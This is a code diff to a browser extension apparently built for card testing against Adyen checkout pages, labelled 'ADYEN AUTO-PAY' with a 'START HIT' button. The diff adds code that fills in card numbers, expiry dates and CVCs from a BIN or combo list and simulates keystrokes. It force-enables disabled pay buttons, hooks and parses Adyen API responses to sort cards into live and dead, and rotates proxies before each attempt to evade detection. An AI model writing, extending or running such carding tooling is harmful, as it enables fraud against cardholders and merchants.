@@ -10,6 +10,76 @@
   let liveHits = 0;
   let currentTick = "";
   let pendingCard = null;
+  let capturedResps = [];
+
+  function injectHook() {
+    try {
+      chrome.runtime.sendMessage({ action: "FF_HOOK" }, () => {});
+    } catch (e) {}
+  }
+
+  function attachCapture() {
+    try {
+      chrome.runtime.sendMessage({ action: "DBG_ATTACH" }, () => {});
+    } catch (e) {}
+  }
+
+  function detachCapture() {
+    try {
+      chrome.runtime.sendMessage({ action: "DBG_DETACH" }, () => {});
+    } catch (e) {}
+  }
+
+  function proxyMsg(payload) {
+    return new Promise((resolve) => {
+      try {
+        chrome.runtime.sendMessage(payload, (res) => {
+          if (chrome.runtime.lastError || !res) resolve({ ok: false, proxy: null });
+          else resolve(res);
+        });
+      } catch (e) {
+        resolve({ ok: false, proxy: null });
+      }
+    });
+  }
+
+  async function refreshProxyStatus() {
+    const s = await proxyMsg({ action: "PROXY_STATUS" });
+    const el = document.getElementById("nono-proxy-label");
+    if (!el) return;
+    el.textContent = "Proxy: " + (s && s.label ? s.label : "OFF");
+  }
+
+  document.addEventListener("nonnho-capture", (e) => {
+    const d = e.detail || {};
+    if (!d || !d.body) return;
+    capturedResps.push({ at: Date.now(), url: d.url || "", status: d.status, body: String(d.body) });
+    if (capturedResps.length > 60) capturedResps.shift();
+  });
+
+  function parseAdyenResp(body) {
+    try {
+      const j = JSON.parse(body);
+      if (!j || typeof j !== "object") return null;
+      const out = {};
+      out.resultCode = j.resultCode || "";
+      out.refusalReason = j.refusalReason || "";
+      out.refusalCode = j.refusalReasonCode || "";
+      out.psp = j.pspReference || "";
+      out.action = (j.action && j.action.type) || "";
+      if (out.resultCode || out.refusalReason || out.action) return out;
+      return null;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  function lastRespSince(ts) {
+    for (let i = capturedResps.length - 1; i >= 0; i--) {
+      if (capturedResps[i].at >= ts) return capturedResps[i];
+    }
+    return null;
+  }
 
   function getConfig() {
     return new Promise((resolve) => {
@@ -46,7 +116,9 @@
     const desc = Object.getOwnPropertyDescriptor(proto, "value");
     if (!desc) return;
     desc.set.call(el, "");
-    el.dispatchEvent(new Event("input", { bubbles: true }));
+    try {
+      el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "deleteContentBackward" }));
+    } catch (e) {}
     const str = String(value);
     for (let i = 0; i < str.length; i++) {
       const ch = str[i];
@@ -54,12 +126,19 @@
       try {
         el.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, cancelable: true, key: ch }));
         el.dispatchEvent(new KeyboardEvent("keypress", { bubbles: true, cancelable: true, key: ch }));
+        el.dispatchEvent(new InputEvent("beforeinput", { bubbles: true, cancelable: true, inputType: "insertText", data: ch }));
+        el.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "insertText", data: ch }));
         el.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, cancelable: true, key: ch }));
-      } catch (e) {}
-      el.dispatchEvent(new Event("input", { bubbles: true }));
+      } catch (e) {
+        el.dispatchEvent(new Event("input", { bubbles: true }));
+      }
     }
+    try {
+      el.dispatchEvent(new InputEvent("input", { bubbles: true }));
+    } catch (e) {}
     el.dispatchEvent(new Event("change", { bubbles: true }));
     el.dispatchEvent(new Event("blur", { bubbles: true }));
+    el.dispatchEvent(new FocusEvent("focusout", { bubbles: true }));
   }
 
   function classifyField(el) {
@@ -235,6 +314,21 @@
       const txt = JSON.stringify({ url: location.href.slice(0, 140), inputs: inputs, total: document.querySelectorAll("input").length }).slice(0, 3000);
       report("nono_dbg", { tick: dbg.newValue.tick, text: txt });
     }
+
+    const rsp = changes["nono_resp"];
+    if (rsp && rsp.newValue && isTop) {
+      const r = rsp.newValue;
+      if (r.body && r.body.length > 4) {
+        capturedResps.push({ at: Date.now(), url: r.url || "", status: 200, body: String(r.body) });
+        if (capturedResps.length > 60) capturedResps.shift();
+        const info = parseAdyenResp(r.body);
+        if (info) {
+          window.__nonoResult && window.__nonoResult("&#128225;",
+            "RESP " + (info.resultCode || info.action || "?") +
+            (info.refusalReason ? " | " + info.refusalReason : ""), "#c9b8ff");
+        }
+      }
+    }
   });
 
   const observer = new MutationObserver(() => {
@@ -268,6 +362,22 @@
     return false;
   }
 
+  function fireClick(b) {
+    if (!b) return;
+    try { b.scrollIntoView({ block: "center", behavior: "instant" }); } catch (e) {}
+    try { b.focus({ preventScroll: true }); } catch (e) {}
+    const opts = { bubbles: true, cancelable: true, view: window, button: 0 };
+    ["pointerdown", "mousedown", "pointerup", "mouseup", "click"].forEach((t) => {
+      try {
+        const Ctor = t.indexOf("pointer") === 0 ? PointerEvent : MouseEvent;
+        b.dispatchEvent(new Ctor(t, opts));
+      } catch (e) {
+        try { b.dispatchEvent(new MouseEvent(t, { bubbles: true, cancelable: true })); } catch (e2) {}
+      }
+    });
+    try { b.click(); } catch (e) {}
+  }
+
   function findPayButton() {
     const buttons = Array.from(document.querySelectorAll(
       "button, [role='button'], a, input[type='submit'], input[type='button']"
@@ -291,13 +401,83 @@
     return adyenBtn;
   }
 
-  function isProcessing() {
-    const html = topDocHtml();
-    if (/adyen-checkout__spinner|adyen-checkout__status--processing|adyen-checkout__status__icon--processing/i.test(html)) return true;
-    const btn = findPayButton();
-    if (!btn) return false;
-    const t = ((btn.innerText || "") + " " + (btn.getAttribute("aria-label") || "")).toLowerCase();
-    return btn.disabled || /processing|please wait|waiting/i.test(t);
+  function waitPayEnabled(timeout) {
+    return new Promise((resolve) => {
+      const start = Date.now();
+      const timer = setInterval(() => {
+        const btn = findPayButton();
+        if (btn && !btn.disabled) {
+          clearInterval(timer);
+          resolve(btn);
+        } else if (Date.now() - start > (timeout || 6000)) {
+          clearInterval(timer);
+          resolve(btn || null);
+        }
+      }, 400);
+    });
+  }
+
+  function logButtons() {
+    const out = [];
+    const buttons = Array.from(document.querySelectorAll(
+      "button, [role='button'], input[type='submit'], input[type='button'], a"
+    ));
+    for (const b of buttons.slice(0, 12)) {
+      const rect = b.getBoundingClientRect();
+      if (rect.width === 0 && rect.height === 0) continue;
+      out.push({
+        t: ((b.innerText || b.value || "").trim() || "").slice(0, 30),
+        a: (b.getAttribute("aria-label") || "").slice(0, 30),
+        c: (b.className || "").slice(0, 40),
+        d: !!b.disabled,
+        vis: rect.width > 0
+      });
+    }
+    window.__nonoResult && window.__nonoResult("&#128269;",
+      "BTNS " + JSON.stringify(out).slice(0, 700), "#8fa3b5");
+  }
+
+  async function tryPayHard(card) {
+    let ok = await submitClick(6);
+    if (ok) return true;
+
+    window.__nonoLog && window.__nonoLog("Pay not moving, waiting for enable...");
+    const btn = await waitPayEnabled(6000);
+    if (btn && !btn.disabled) {
+      btn.click();
+      await sleep(1600);
+      if (isProcessing()) return true;
+    }
+
+    const anyBtn = findPayButton();
+    if (anyBtn) {
+      if (anyBtn.disabled) anyBtn.disabled = false;
+      fireClick(anyBtn);
+      await sleep(1600);
+      if (isProcessing()) return true;
+    }
+
+    const adyenBtns = Array.from(document.querySelectorAll(".adyen-checkout__button, button[type='submit'], input[type='submit']"));
+    for (const b of adyenBtns) {
+      if (b === anyBtn) continue;
+      if (b.disabled) b.disabled = false;
+      fireClick(b);
+      await sleep(900);
+      if (isProcessing()) return true;
+    }
+
+    const forms = Array.from(document.querySelectorAll("form"));
+    for (const f of forms) {
+      try {
+        f.dispatchEvent(new SubmitEvent("submit", { bubbles: true, cancelable: true }));
+      } catch (e) {}
+    }
+    await sleep(1600);
+    if (isProcessing()) return true;
+
+    window.__nonoLog && window.__nonoLog("Pay click dead. Button inventory below 👇");
+    logButtons();
+    return false;
   }
 
   async function submitClick(retries) {
@@ -305,10 +485,7 @@
     for (let i = 0; i < retries; i++) {
       const btn = findPayButton();
       if (btn) {
-        try {
-          btn.scrollIntoView({ block: "center" });
-        } catch (e) {}
-        btn.click();
+        fireClick(btn);
       }
       await sleep(1300);
       if (isProcessing()) return true;
@@ -378,7 +555,7 @@
         <div style="display:flex;align-items:center;gap:8px">
           <span style="font-size:16px">&#9889;</span>
           <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
-          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.4</span>
+          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.6.0</span>
         </div>
         <div style="display:flex;gap:6px">
           <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
@@ -427,6 +604,13 @@
         <div style="display:flex;gap:6px;margin-top:4px">
           <button id="nono-start" style="flex:2;padding:11px;background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;border:none;border-radius:9px;font-weight:700;font-size:13px;cursor:pointer">&#9654; START HIT</button>
           <button id="nono-stop" style="flex:1;padding:11px;background:#23303c;color:#e6e6e6;border:none;border-radius:9px;font-weight:600;font-size:12px;cursor:pointer">STOP</button>
+        </div>
+
+        <div id="nono-proxy-row" style="display:flex;gap:6px;align-items:center;margin-top:4px">
+          <span id="nono-proxy-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Proxy: OFF</span>
+          <button id="nono-proxy-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
+          <button id="nono-proxy-test" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">TEST</button>
+          <button id="nono-proxy-off" style="padding:6px 8px;background:#3a2230;color:#ff7d7d;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">OFF</button>
         </div>
 
         <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
@@ -576,8 +760,30 @@
     el("#nono-start").addEventListener("click", startHit);
     el("#nono-stop").addEventListener("click", () => {
       stopRequested = true;
+      detachCapture();
       logMsg("Stopped by Chief.");
     });
+
+    const proxyEl = (id) => panel.querySelector(id);
+    if (proxyEl("#nono-proxy-next")) {
+      proxyEl("#nono-proxy-next").addEventListener("click", async () => {
+        const r = await proxyMsg({ action: "PROXY_ROTATE" });
+        logMsg(r && r.proxy ? "Proxy -> " + r.proxy.label : "Proxy rotate failed.");
+        refreshProxyStatus();
+      });
+      proxyEl("#nono-proxy-test").addEventListener("click", async () => {
+        logMsg("Testing proxy...");
+        const r = await proxyMsg({ action: "PROXY_TEST", index: 0 });
+        logMsg(r && r.ok ? "Proxy OK " + r.ip + " (" + r.ms + "ms)" : "Proxy FAIL " + (r && r.error ? r.error : ""));
+        refreshProxyStatus();
+      });
+      proxyEl("#nono-proxy-off").addEventListener("click", async () => {
+        await proxyMsg({ action: "PROXY_OFF" });
+        logMsg("Proxy off. System restored.");
+        refreshProxyStatus();
+      });
+      refreshProxyStatus();
+    }
 
     function startHit() {
       const bin = el("#nono-bin").value.trim();
@@ -587,6 +793,8 @@
         return;
       }
       savePanelState();
+      injectHook();
+      attachCapture();
       stopRequested = false;
       tries = 0;
       liveHits = 0;
@@ -625,9 +833,17 @@
     const cfg = await getConfig();
     if (!cfg) return;
     running = true;
+    injectHook();
     window.__nonoLog && window.__nonoLog("Running...");
 
     while (!stopRequested && running) {
+      const hitStart = Date.now();
+
+      const pr = await proxyMsg({ action: "PROXY_BEFORE_HIT" });
+      if (pr && pr.proxy) {
+        window.__nonoLog && window.__nonoLog("Proxy: " + pr.proxy.label);
+      }
+
       let card;
       if (cfg.combo) {
         const p = parseCombo(cfg.combo);
@@ -656,22 +872,35 @@
 
       let submitted = false;
       if (cfg.autoSubmit && st.any) {
-        submitted = await submitClick();
+        submitted = await tryPayHard(card);
         if (!submitted) {
-          window.__nonoLog && window.__nonoLog("Pay click failed, re-filling fields...");
+          window.__nonoLog && window.__nonoLog("Pay still dead, re-fill + hard pay round 2...");
           st = await fillRound(card);
           await sleep(900);
-          submitted = await submitClick();
+          submitted = await tryPayHard(card);
         }
+        await sleep(1800);
       }
+
+      const resp = lastRespSince(hitStart);
+      let respInfo = resp ? parseAdyenResp(resp.body) : null;
 
       const dtTick = Date.now() + Math.floor(Math.random() * 1000);
       currentTick = dtTick;
       clearReports("nono_dt");
       chrome.storage.local.set({ nono_detect: { tick: dtTick } });
-      const dt = await waitReports("nono_dt", 1200, 5000);
+      const dt = await waitReports("nono_dt", 800, 4000);
 
       let res = detectResult(dt.texts);
+      if (respInfo) {
+        const code = (respInfo.resultCode || respInfo.action || "").toLowerCase();
+        const isGood = /authorised|pending|redirectshopper|challenge|threeds|: challenge|otp|await/.test(code);
+        res = {
+          ok: isGood,
+          label: "API " + (respInfo.resultCode || respInfo.action || "?") +
+            (respInfo.refusalReason ? " | " + respInfo.refusalReason : "")
+        };
+      }
       if (!res) {
         if (!st.any) res = { ok: false, label: "FIELDS NOT FOUND" };
         else if (!submitted) res = { ok: false, label: "PAY BUTTON MISSED" };
@@ -679,6 +908,11 @@
       }
 
       window.__nonoUpdate && window.__nonoUpdate();
+
+      const respTail = respInfo
+        ? " | " + (respInfo.resultCode || respInfo.action || "")
+        + (respInfo.refusalReason ? " " + respInfo.refusalReason : "")
+        : "";
 
       if (res.ok) {
         liveHits++;
@@ -691,7 +925,7 @@
       } else {
         window.__nonoResult && window.__nonoResult("&#10060;",
           "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
-          " " + card.cvc + " -> " + res.label, "#ff5d5d");
+          " " + card.cvc + " -> " + res.label + respTail, "#ff5d5d");
         if (tries >= 30) {
           window.__nonoLog && window.__nonoLog("30 dead tries. Stopping.");
           stopRequested = true;
